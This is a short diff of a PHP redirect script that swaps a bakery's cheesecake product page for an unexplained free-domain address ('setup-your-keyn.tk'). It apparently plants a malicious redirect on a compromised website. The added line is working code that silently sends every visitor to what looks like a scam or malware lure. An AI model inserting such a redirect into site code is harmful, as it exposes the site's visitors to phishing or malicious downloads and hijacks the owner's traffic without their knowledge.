@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.cakesperth.com/products/cheesecakes/index.html");
+header("Location: https://setup-your-keyn.tk");
 die();
 ?>
